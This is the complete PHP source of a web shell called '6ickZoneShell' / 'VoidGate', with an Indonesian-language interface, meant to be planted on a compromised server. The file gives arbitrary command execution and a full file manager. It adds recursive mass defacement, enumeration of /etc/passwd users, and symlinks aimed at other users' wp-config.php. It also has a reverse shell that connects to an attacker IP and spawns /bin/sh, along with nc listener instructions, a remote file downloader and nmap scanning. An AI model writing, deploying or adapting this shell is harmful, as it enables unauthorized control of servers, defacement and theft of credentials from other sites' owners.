<?php
/**
 * 6ickZoneShell Manager by 0x6ick x Nyx6st | Copyright 2025 by 6ickwhispers@gmail.com
 * --- RE-ORGANIZED MENU VERSION by Nyx6st ---
 * All features integrated, with new menu layout and network tools.
 **/
error_reporting(0);
session_start();
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
ini_set('memory_limit', '256M');
header('Content-Type: text/html; charset=UTF-8');
ob_end_clean();

// --- CONFIG ---
$title = "ヤミRoot VoidGate";
$author = "0x6ick";
$theme_bg = "#0a0a0f"; // Dark violet-black cyber base
$theme_fg = "#E0FF00"; // Neon yellow text
$theme_highlight = "#FF00C8"; // Pink cyber glow
$theme_link = "#00FFF7"; // Electric cyan
$theme_link_hover = "#FF00A0"; // Pink on hover
$theme_border_color = "#7D00FF"; // Neon purple border
$theme_table_header_bg = "#1a0025"; // Dark purple-ish header
$theme_table_row_hover = "#330033"; // Deep glitch violet
$theme_input_bg = "#120024"; // Dark form input bg
$theme_input_fg = "#00FFB2"; // Neon greenish-cyan input text
$font_family = "'Orbitron', sans-serif"; // Futuristic mecha font
$message_success_color = "#39FF14"; // Bright lime green
$message_error_color = "#FF0033"; // Neon blood red

// --- FUNCTIONS ---
function sanitizeFilename($filename) { return basename($filename); }
function exe($cmd) { if (function_exists('exec')) { exec($cmd . ' 2>&1', $output); return implode("\n", $output); } elseif (function_exists('shell_exec')) { return shell_exec($cmd); } elseif (function_exists('passthru')) { ob_start(); passthru($cmd); return ob_get_clean(); } elseif (function_exists('system')) { ob_start(); system($cmd); return ob_get_clean(); } return "Command execution disabled."; }
function perms($file){ $perms = @fileperms($file); if ($perms === false) return '????'; if (($perms & 0xC000) == 0xC000) $info = 's'; elseif (($perms & 0xA000) == 0xA000) $info = 'l'; elseif (($perms & 0x8000) == 0x8000) $info = '-'; elseif (($perms & 0x6000) == 0x6000) $info = 'b'; elseif (($perms & 0x4000) == 0x4000) $info = 'd'; elseif (($perms & 0x2000) == 0x2000) $info = 'c'; elseif (($perms & 0x1000) == 0x1000) $info = 'p'; else $info = 'u'; $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info; }
function delete_recursive($target) { if (!file_exists($target)) return true; if (!is_dir($target)) return unlink($target); foreach (scandir($target) as $item) { if ($item == '.' || $item == '..') continue; if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false; } return rmdir($target); }
function zip_add_folder($zip, $folder, $base_path_length) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder), RecursiveIteratorIterator::LEAVES_ONLY); foreach ($files as $file) { if (!$file->isDir()) { $file_path = $file->getRealPath(); $relative_path = substr($file_path, $base_path_length); $zip->addFile($file_path, $relative_path); } } }
function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '') { global $path; $redirect_path = !empty($current_path) ? $current_path : $path; $params = ['path' => $redirect_path]; if ($msg_type) $params['msg_type'] = $msg_type; if ($msg_text) $params['msg_text'] = $msg_text; header("Location: ?" . http_build_query($params)); exit(); }

// --- INITIAL SETUP & PATH ---
$path = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd());
$path = str_replace('\\','/',$path);

// --- HANDLERS FOR ACTIONS THAT REDIRECT ---
if(isset($_POST['start_mass_deface'])) { $mass_deface_results = ''; function mass_deface_recursive($dir, $file, $content, &$res) { if(!is_writable($dir)) {$res .= "[<font color=red>FAILED</font>] ".htmlspecialchars($dir)."<br>"; return;} foreach(scandir($dir) as $item) { if($item === '.' || $item === '..') continue; $lokasi = $dir.DIRECTORY_SEPARATOR.$item; if(is_dir($lokasi)) { if(is_writable($lokasi)) { file_put_contents($lokasi.DIRECTORY_SEPARATOR.$file, $content); $res .= "[<font color=lime>DONE</font>] ".htmlspecialchars($lokasi.DIRECTORY_SEPARATOR.$file)."<br>"; mass_deface_recursive($lokasi, $file, $content, $res); } else { $res .= "[<font color=red>FAILED</font>] ".htmlspecialchars($lokasi)."<br>"; } } } } function mass_deface_flat($dir, $file, $content, &$res) { if(!is_writable($dir)) {$res .= "[<font color=red>FAILED</font>] ".htmlspecialchars($dir)."<br>"; return;} foreach(scandir($dir) as $item) { if($item === '.' || $item === '..') continue; $lokasi = $dir.DIRECTORY_SEPARATOR.$item; if(is_dir($lokasi) && is_writable($lokasi)) { file_put_contents($lokasi.DIRECTORY_SEPARATOR.$file, $content); $res .= "[<font color=lime>DONE</font>] ".htmlspecialchars($lokasi.DIRECTORY_SEPARATOR.$file)."<br>"; } } } if($_POST['tipe_sabun'] == 'mahal') mass_deface_recursive($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results); else mass_deface_flat($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results); $_SESSION['feature_output'] = $mass_deface_results; redirect_with_message('success', 'Mass Deface Selesai!', $path); }
if(isset($_FILES['file_upload'])){ $file_name = sanitizeFilename($_FILES['file_upload']['name']); if(copy($_FILES['file_upload']['tmp_name'], $path.'/'.$file_name)) redirect_with_message('success', 'UPLOAD SUCCESS: ' . $file_name, $path); else redirect_with_message('error', 'File Gagal Diupload !!', $path); }
if (isset($_POST['bulk_action']) && class_exists('ZipArchive')) { $action = $_POST['bulk_action']; $selected_files = isset($_POST['selected_files']) ? $_POST['selected_files'] : []; if ($action === 'zip_selected' && !empty($selected_files)) { $zip_filename = 'archive_' . date('Y-m-d_H-i-s') . '.zip'; $zip_filepath = $path . DIRECTORY_SEPARATOR . $zip_filename; $zip = new ZipArchive(); if ($zip->open($zip_filepath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) { foreach ($selected_files as $file) { $file_path = realpath($file); if (is_file($file_path)) $zip->addFile($file_path, basename($file_path)); elseif (is_dir($file_path)) zip_add_folder($zip, $file_path, strlen(dirname($file_path) . DIRECTORY_SEPARATOR)); } $zip->close(); redirect_with_message('success', 'File berhasil di-zip ke: ' . $zip_filename, $path); } else { redirect_with_message('error', 'Gagal membuat file zip!', $path); } } }
if(isset($_GET['option']) && isset($_POST['opt_action'])){ $target_full_path = $_POST['path_target']; $action = $_POST['opt_action']; $current_dir = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd()); switch ($action) { case 'delete': if (delete_recursive($target_full_path)) redirect_with_message('success', 'DELETE SUCCESS !!', $current_dir); else redirect_with_message('error', 'Gagal menghapus! Periksa izin.', $current_dir); break; case 'chmod_save': if(chmod($target_full_path, octdec($_POST['perm_value']))) redirect_with_message('success', 'CHMOD SUCCESS !!', $current_dir); else redirect_with_message('error', 'CHMOD Gagal !!', $current_dir); break; case 'rename_save': $new_full_path = dirname($target_full_path).'/'.sanitizeFilename($_POST['new_name_value']); if(rename($target_full_path, $new_full_path)) redirect_with_message('success', 'RENAME SUCCESS !!', $current_dir); else redirect_with_message('error', 'RENAME Gagal !!', $current_dir); break; case 'edit_save': if(is_writable($target_full_path)) { if(file_put_contents($target_full_path, $_POST['src_content'])) redirect_with_message('success', 'EDIT SUCCESS !!', $current_dir); else redirect_with_message('error', 'Edit File Gagal !!', $current_dir); } else { redirect_with_message('error', 'File tidak writable!', $current_dir); } break; case 'extract_save': if (class_exists('ZipArchive')) { $zip = new ZipArchive; if ($zip->open($target_full_path) === TRUE) { $zip->extractTo($current_dir); $zip->close(); redirect_with_message('success', 'File berhasil diekstrak!', $current_dir); } else { redirect_with_message('error', 'Gagal membuka file zip!', $current_dir); } } else { redirect_with_message('error', 'Class ZipArchive tidak ditemukan!', $current_dir); } break; } }
if(isset($_GET['create_new'])) { $target_path_new = $path . '/' . sanitizeFilename($_POST['create_name']); if ($_POST['create_type'] == 'file') { if (@file_put_contents($target_path_new, '') !== false) redirect_with_message('success', 'File Baru Berhasil Dibuat', $path); else redirect_with_message('error', 'Gagal membuat file baru!', $path); } elseif ($_POST['create_type'] == 'dir') { if (@mkdir($target_path_new)) redirect_with_message('success', 'Folder Baru Berhasil Dibuat', $path); else redirect_with_message('error', 'Gagal membuat folder baru!', $path); } }
if(isset($_POST['curl_download'])) { $url = $_POST['url']; $filename = sanitizeFilename(basename($url)); if (empty($filename)) { $filename = 'downloaded_file'; } if (copy($url, $path . '/' . $filename)) { redirect_with_message('success', 'File ' . $filename . ' berhasil di-download!', $path); } else { redirect_with_message('error', 'Gagal men-download file dari URL!', $path); } }
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<title><?php echo htmlspecialchars($title); ?></title>
<style>
body{font-family:'Orbitron',sans-serif;background-color:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;margin:0;padding:0;} a{font-size:1em;color:<?php echo $theme_link;?>;text-decoration:none;} a:hover{color:<?php echo $theme_link_hover;?>;} table{border-collapse:collapse;width:95%;max-width:1200px;margin:15px auto;} .td_home{border:2px solid <?php echo $theme_table_row_hover;?>;padding:7px;vertical-align:middle;} #content tr:hover{background-color:<?php echo $theme_table_row_hover;?>;} #content .first{background-color:<?php echo $theme_table_header_bg;?>;font-weight:bold;padding:10px;} input,select,textarea{border:1px solid <?php echo $theme_link_hover;?>;border-radius:5px;background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_input_fg;?>;font-family:'Kelly Slab',cursive;padding:5px;box-sizing:border-box;} input[type="submit"]{background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_fg;?>;border:2px solid <?php echo $theme_fg;?>;cursor:pointer;font-weight:bold;} input[type="submit"]:hover{background:<?php echo $theme_fg;?>;color:<?php echo $theme_input_bg;?>;} h1,h3{font-family:'Kelly Slab';text-align:center;} h1{font-size:35px;color:white;margin:20px 0 10px;} h3{color:<?php echo $theme_highlight;?>} .path-nav{margin:10px auto;width:95%;max-width:1200px;text-align:left;word-wrap:break-word;} .message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:1200px;font-weight:bold;text-align:center;} .message.success{background-color:<?php echo $message_success_color;?>;color:<?php echo $theme_bg;?>;} .message.error{background-color:<?php echo $message_error_color;?>;color:white;} .section-box{background-color:#1a1a1a;border:1px solid <?php echo $theme_border_color;?>;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:1200px;} .main-menu{margin:20px auto;width:95%;max-width:1200px;text-align:center;padding:10px 0;border-top:1px solid <?php echo $theme_border_color;?>;border-bottom:1px solid <?php echo $theme_border_color;?>;} .main-menu div { margin-bottom: 5px; } .main-menu a{margin:0 8px;font-size:1.1em;white-space:nowrap;} pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#00FFD1;} code{background:#333;color:#FFB800;padding:2px 5px;border-radius:3px;} details summary {cursor:pointer; background:#222; padding:5px; border-radius:3px; margin-bottom: 5px;}
</style>
</head>
<body>
<a href="?"><h1 style="color: white;"><?php echo htmlspecialchars($title); ?></h1></a>
<?php
if(isset($_GET['msg_text'])) { echo "<div class='message ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; }
if(isset($_SESSION['feature_output'])) { echo '<div class="section-box"><h3>Hasil Fitur Sebelumnya:</h3><pre>'.$_SESSION['feature_output'].'</pre></div>'; unset($_SESSION['feature_output']); }
?>
<table class="system-info-table" width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>
<font color='white'><i class='fa fa-user'></i> User / IP </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $_SERVER['REMOTE_ADDR']; ?></font>
<tr><td><font color='white'><i class='fa fa-desktop'></i> Host / Server </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']; ?></font>
<tr><td><font color='white'><i class='fa fa-hdd-o'></i> System </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo php_uname(); ?></font>
</tr></td></table>
<div class="main-menu">
    <div>
        <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Command</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=upload_form">Upload</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=create_form">Create</a>
    </div>
    <div>
        <a href="?path=<?php echo urlencode($path); ?>&action=mass_deface_form">Mass Deface</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=jumping">Jumping</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=symlink">Symlink</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=reverse_shell">Reverse Shell</a>
    </div>
    <div>
        <a href="?path=<?php echo urlencode($path); ?>&action=ping">Ping</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=portscan">Port Scan</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=dnslookup">DNS Lookup</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=whois">Whois</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=header">Header</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=curl">cURL</a>
    </div>
</div>
<div class="path-nav">
    <i class="fa fa-folder-o"></i> :
    <?php
    $paths_array = explode('/', trim($path, '/'));
    echo '<a href="?path=/">/</a>';
    $current_built_path = '';
    foreach($paths_array as $pat){
        if(empty($pat)) continue;
        $current_built_path .= '/' . $pat;
        echo '<a href="?path='.urlencode($current_built_path).'">'.htmlspecialchars($pat).'</a>/';
    }
    ?>
</div>
<?php
$show_file_list = true;
if (isset($_GET['action'])) {
    $show_file_list = false;
    echo '<div class="section-box">';
    switch ($_GET['action']) {
        // --- BASIC ACTIONS ---
        case 'cmd': $cmd_output = (isset($_POST['do_cmd'])) ? htmlspecialchars(exe($_POST['cmd_input'])) : ''; echo '<h3>Execute Command</h3><form method="POST" action="?action=cmd&path='.urlencode($path).'"><input type="text" name="cmd_input" placeholder="whoami" style="width: calc(100% - 80px);" autofocus><input type="submit" name="do_cmd" value=">>" style="width: 70px;"></form>'; if($cmd_output) echo '<h4>Output:</h4><pre>'.$cmd_output.'</pre>'; break;
        case 'upload_form': echo '<h3>Upload File</h3><form enctype="multipart/form-data" method="POST" action="?path='.urlencode($path).'"><input type="file" name="file_upload" required/><input type="submit" value="UPLOAD" style="margin-left:10px;"/></form>'; break;
        case 'create_form': echo '<h3>Create New</h3><form method="POST" action="?create_new=true&path='.urlencode($path).'"><select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select> <input type="text" name="create_name" required placeholder="Nama file/folder"> <input type="submit" value="Create"></form>'; break;
        // --- HACKING TOOLS ---
        case 'mass_deface_form': echo '<h3>Mass Deface</h3><form method="post" action="?path='.urlencode($path).'"><p>Tipe:<br><input type="radio" name="tipe_sabun" value="murah" checked>Biasa (1 level) | <input type="radio" name="tipe_sabun" value="mahal">Massal (Rekursif)</p><p>Folder Target:<br><input type="text" name="d_dir" value="'.htmlspecialchars($path).'" style="width:100%"></p><p>Nama File:<br><input type="text" name="d_file" value="index.html" style="width:100%"></p><p>Isi Script:<br><textarea name="script_content" style="width:100%;height:150px">Hacked By 0x6ick</textarea></p><input type="submit" name="start_mass_deface" value="GAS!" style="width:100%"></form>'; break;
        case 'jumping': echo '<h3><i class="fa fa-users"></i> Jumping (User Scanner)</h3><p>Membaca <code>/etc/passwd</code> untuk menemukan semua user di server dan memeriksa akses direktori home.</p>'; if (is_readable('/etc/passwd')) { preg_match_all('/(^[a-zA-Z0-9\._-]+):x:/m', file_get_contents('/etc/passwd'), $matches); if(!empty($matches[1])){ echo '<table><tr class="first"><th>Username</th><th>Home Directory</th><th>Status</th><th>Aksi</th></tr>'; foreach ($matches[1] as $user) { $home_dir = '/home/' . $user; if (is_readable($home_dir)) { $status = '<font color="lime">Bisa Dibaca</font>'; $action = '<a href="?path='.urlencode($home_dir).'">Jelajahi</a>'; } else { $status = '<font color="red">Tidak Bisa Dibaca</font>'; $action = '-'; } echo '<tr><td class="td_home">'.htmlspecialchars($user).'</td><td class="td_home">'.htmlspecialchars($home_dir).'</td><td class="td_home">'.$status.'</td><td class="td_home">'.$action.'</td></tr>'; } echo '</table>'; } } else { echo '<p style="color:red;"><strong>Gagal:</strong> File <code>/etc/passwd</code> tidak bisa dibaca.</p>'; } break;
        case 'symlink': echo '<h3><i class="fa fa-link"></i> Symlink Creator</h3>'; if (!function_exists('symlink')) { echo '<p style="color:red;"><strong>Gagal:</strong> Fungsi <code>symlink()</code> dinonaktifkan di server ini.</p>'; } else { if (isset($_POST['create_symlink'])) { if (symlink($_POST['target_file'], $path . DIRECTORY_SEPARATOR . sanitizeFilename($_POST['link_name']))) { echo '<p style="color:lime;"><strong>Sukses!</strong> Symlink dibuat. Akses di: <a href="'.htmlspecialchars(sanitizeFilename($_POST['link_name'])).'" target="_blank">'.htmlspecialchars($path . DIRECTORY_SEPARATOR . sanitizeFilename($_POST['link_name'])).'</a></p>'; } else { echo '<p style="color:red;"><strong>Gagal!</strong> Tidak bisa membuat symlink.</p>'; } } echo '<form method="POST" action="?action=symlink&path='.urlencode($path).'"><p>Target File (Full Path):<br><input type="text" name="target_file" style="width:100%" placeholder="/home/userlain/public_html/wp-config.php"></p><p>Nama Link (di direktori ini):<br><input type="text" name="link_name" style="width:100%" placeholder="config_lain.txt"></p><input type="submit" name="create_symlink" value="Buat Symlink"></form>'; } break;
        case 'reverse_shell': echo '<h3><i class="fa fa-terminal"></i> Reverse Shell</h3>'; if (!function_exists('fsockopen') || !function_exists('proc_open')) { echo '<p style="color:red;"><strong>Gagal:</strong> Fungsi <code>fsockopen()</code> atau <code>proc_open()</code> dinonaktifkan.</p>'; } else { $ip_attacker = isset($_POST['ip_attacker']) ? htmlspecialchars($_POST['ip_attacker']) : $_SERVER['REMOTE_ADDR']; $port_attacker = isset($_POST['port_attacker']) ? htmlspecialchars($_POST['port_attacker']) : '4444'; echo '<div style="background:#222;border:1px solid #444;padding:10px;margin-bottom:15px;border-radius:5px;"><h4><i class="fa fa-info-circle"></i> Cara Pakai:</h4><ol><li>Di terminalmu, jalankan listener: <code>nc -lvnp '.$port_attacker.'</code></li><li>Masukkan <strong>IP Publik</strong> komputermu di bawah.</li><li>Klik "GASKEUN!". Halaman browser ini mungkin akan terus loading (normal).</li><li>Cek terminalmu, shell server akan muncul jika berhasil.</li></ol></div>'; echo '<form method="POST" action="?action=reverse_shell&path='.urlencode($path).'"><label>IP Attacker: <input type="text" name="ip_attacker" value="'.$ip_attacker.'"></label> <label>Port: <input type="text" name="port_attacker" value="'.$port_attacker.'" size="5"></label> <input type="submit" name="start_reverse_shell" value="GASKEUN!"></form>'; if (isset($_POST['start_reverse_shell'])) { echo "<h4>Mencoba koneksi ke ".htmlspecialchars($_POST['ip_attacker']).":".htmlspecialchars($_POST['port_attacker'])." ...</h4>"; if(ob_get_level()) ob_end_flush(); flush(); set_time_limit(0); ignore_user_abort(true); $sock = @fsockopen($_POST['ip_attacker'], (int)$_POST['port_attacker'], $errno, $errstr, 30); if (!$sock) { echo '<p style="color:red;"><strong>Koneksi Gagal!</strong> Pastikan listener sudah berjalan.</p>'; } else { echo '<p style="color:lime;"><strong>Koneksi Berhasil!</strong> Cek terminalmu sekarang!</p>'; if(ob_get_level()) ob_end_flush(); flush(); $process = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); if (is_resource($process)) proc_close($process); } } } break;
        // --- NETWORK TOOLS ---
        case 'ping': $ping_output = (isset($_POST['do_ping'])) ? htmlspecialchars(exe("ping -c 4 ".escapeshellarg($_POST['target_host']))) : ''; echo '<h3>Ping</h3><form method="POST" action="?action=ping&path='.urlencode($path).'"><input type="text" name="target_host" placeholder="google.com" required><input type="submit" name="do_ping" value="Ping"></form>'; if($ping_output) echo '<h4>Output:</h4><pre>'.$ping_output.'</pre>'; break;
        case 'portscan': $scan_output = (isset($_POST['do_scan'])) ? htmlspecialchars(exe("nmap -p ".escapeshellarg($_POST['ports'])." ".escapeshellarg($_POST['target_host']))) : ''; echo '<h3>Port Scan (nmap)</h3><form method="POST" action="?action=portscan&path='.urlencode($path).'"><p>Host: <input type="text" name="target_host" placeholder="scanme.nmap.org" required></p><p>Ports: <input type="text" name="ports" placeholder="21,22,80,443" required></p><input type="submit" name="do_scan" value="Scan"></form>'; if($scan_output) echo '<h4>Output:</h4><pre>'.$scan_output.'</pre>'; break;
        case 'dnslookup': $dns_output = (isset($_POST['do_lookup'])) ? htmlspecialchars(exe("dig ".escapeshellarg($_POST['target_domain'])." ".escapeshellarg($_POST['record_type']))) : ''; echo '<h3>DNS Lookup (dig)</h3><form method="POST" action="?action=dnslookup&path='.urlencode($path).'"><p>Domain: <input type="text" name="target_domain" placeholder="google.com" required></p><p>Record Type: <select name="record_type"><option>A</option><option>MX</option><option>NS</option><option>TXT</option><option>ANY</option></select></p><input type="submit" name="do_lookup" value="Lookup"></form>'; if($dns_output) echo '<h4>Output:</h4><pre>'.$dns_output.'</pre>'; break;
        case 'whois': $whois_output = (isset($_POST['do_whois'])) ? htmlspecialchars(exe("whois ".escapeshellarg($_POST['target_domain']))) : ''; echo '<h3>Whois Lookup</h3><form method="POST" action="?action=whois&path='.urlencode($path).'"><input type="text" name="target_domain" placeholder="google.com" required><input type="submit" name="do_whois" value="Whois"></form>'; if($whois_output) echo '<h4>Output:</h4><pre>'.$whois_output.'</pre>'; break;
        case 'header': $header_output = ''; if (isset($_POST['get_header'])) { $url = $_POST['target_url']; if(filter_var($url, FILTER_VALIDATE_URL)) { $headers = get_headers($url, 1); $header_output = htmlspecialchars(print_r($headers, true)); } else { $header_output = 'URL tidak valid.'; } } echo '<h3>HTTP Header Viewer</h3><form method="POST" action="?action=header&path='.urlencode($path).'"><input type="text" name="target_url" placeholder="http://google.com" required style="width:calc(100% - 90px)"><input type="submit" name="get_header" value="Get Header"></form>'; if($header_output) echo '<h4>Output:</h4><pre>'.$header_output.'</pre>'; break;
        case 'curl': echo '<h3>cURL Downloader</h3><form method="POST" action="?path='.urlencode($path).'"><p>URL File:<br><input type="text" name="url" placeholder="https://example.com/file.txt" required style="width:100%"></p><input type="submit" name="curl_download" value="Download ke Direktori Ini"></form>'; break;
        // --- FILE MANAGER ACTIONS ---
        case 'delete': echo '<h3>Konfirmasi Hapus: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><p style="color:red;text-align:center;">Anda YAKIN? Tindakan ini tidak bisa dibatalkan.</p><form method="POST" action="?option=true&path='.urlencode($path).'"><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="delete"><input type="submit" value="YA, HAPUS" style="background:red;color:white;"/> <a href="?path='.urlencode($path).'" style="margin-left:10px;">BATAL</a></form>'; break;
        case 'extract_form': echo '<h3>Konfirmasi Ekstrak: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><p>Ekstrak semua isi file ini ke direktori saat ini ('.htmlspecialchars($path).')?</p><form method="POST" action="?option=true&path='.urlencode($path).'"><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="extract_save"><input type="submit" value="YA, EKSTRAK"/> <a href="?path='.urlencode($path).'" style="margin-left:10px;">BATAL</a></form>'; break;
        case 'view_file': echo '<h3>Viewing: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><textarea style="width:100%;height:400px;" readonly>'.htmlspecialchars(@file_get_contents($_GET['target_file'])).'</textarea>'; break;
        case 'edit_form': echo '<h3>Editing: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.urlencode($path).'"><textarea name="src_content" style="width:100%;height:400px;">'.htmlspecialchars(@file_get_contents($_GET['target_file'])).'</textarea><br><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="edit_save"><input type="submit" value="SAVE"/></form>'; break;
        case 'rename_form': echo '<h3>Rename: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.urlencode($path).'">New Name: <input name="new_name_value" type="text" value="'.htmlspecialchars(basename($_GET['target_file'])).'"/><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"/></form>'; break;
        case 'chmod_form': $current_perms = substr(sprintf('%o', @fileperms($_GET['target_file'])), -4); echo '<h3>Chmod: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.urlencode($path).'">Permission: <input name="perm_value" type="text" size="4" value="'.$current_perms.'"/><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHMOD"/></form>'; break;
    }
    echo '</div>';
}

if ($show_file_list) {
    echo '<form method="POST" action="?path='.urlencode($path).'">';
    echo '<div id="content"><table><tr class="first"><th><input type="checkbox" onclick="document.querySelectorAll(\'.file-checkbox\').forEach(e=>e.checked=this.checked);"></th><th>Name</th><th>Size</th><th>Perm</th><th>Options</th></tr>';
    $scandir_items = @scandir($path);
    if ($scandir_items) {
        usort($scandir_items, function($a, $b) use ($path) { if ($a == '..') return -1; if ($b == '..') return 1; if (is_dir($path.'/'.$a) && !is_dir($path.'/'.$b)) return -1; if (!is_dir($path.'/'.$a) && is_dir($path.'/'.$b)) return 1; return strcasecmp($a, $b); });
        foreach($scandir_items as $item){
            if($item == '.') continue;
            $full_item_path = $path.DIRECTORY_SEPARATOR.$item;
            $encoded_full_item_path = urlencode($full_item_path);
            echo "<tr><td class='td_home' style='text-align:center;'>";
            if ($item != '..') echo "<input type='checkbox' class='file-checkbox' name='selected_files[]' value='".htmlspecialchars($full_item_path)."'>";
            echo "</td><td class='td_home' style='word-break:break-all;'>";
            if($item == '..') echo "<i class='fa fa-folder-open-o'></i> <a href=\"?path=".urlencode(dirname($path))."\">".htmlspecialchars($item)."</a>";
            elseif(is_dir($full_item_path)) echo "<i class='fa fa-folder-o'></i> <a href=\"?path=$encoded_full_item_path\">".htmlspecialchars($item)."</a>";
            else echo "<i class='fa fa-file-o'></i> <a href=\"?action=view_file&target_file=$encoded_full_item_path&path=".urlencode($path)."\">".htmlspecialchars($item)."</a>";
            echo "</td><td class='td_home' style='text-align:center;white-space:nowrap;'>".(is_file($full_item_path) ? round(@filesize($full_item_path)/1024,2).' KB' : '--')."</td>";
            echo "<td class='td_home' style='text-align:center;'><font color='".(is_writable($full_item_path) ? '#57FF00' : (!is_readable($full_item_path) ? '#FF0004' : $theme_fg))."'>".perms($full_item_path)."</font></td>";
            echo "<td class='td_home' style='text-align:center;'><select style='width:100px;' onchange=\"if(this.value) window.location.href='?action='+this.value+'&target_file={$encoded_full_item_path}&path=".urlencode($path)."'\"><option value=''>Action</option><option value='delete'>Delete</option>";
            if(is_file($full_item_path)) { echo "<option value='edit_form'>Edit</option>"; if(class_exists('ZipArchive') && pathinfo($full_item_path, PATHINFO_EXTENSION) == 'zip') echo "<option value='extract_form'>Extract</option>"; }
            echo "<option value='rename_form'>Rename</option><option value='chmod_form'>Chmod</option></select></td></tr>";
        }
    } else { echo "<tr><td colspan='5' style='text-align:center;'><font color='red'>Gagal membaca direktori.</font></td></tr>"; }
    if (class_exists('ZipArchive')) {
        echo '<tfoot><tr class="first"><td colspan="5">With selected: <select name="bulk_action"><option value="">Choose...</option><option value="zip_selected">Zip</option></select> <input type="submit" value="Go"></td></tr></tfoot>';
    }
    echo '</table></div></form>';
}
?>
<hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 1200px; margin: 15px auto;">
<center><font color="#fff" size="2px"><b>Coded With &#x1f497; by <font color="#7e52c6"><?php echo htmlspecialchars($author); ?></font></b></center>
</body>
</html>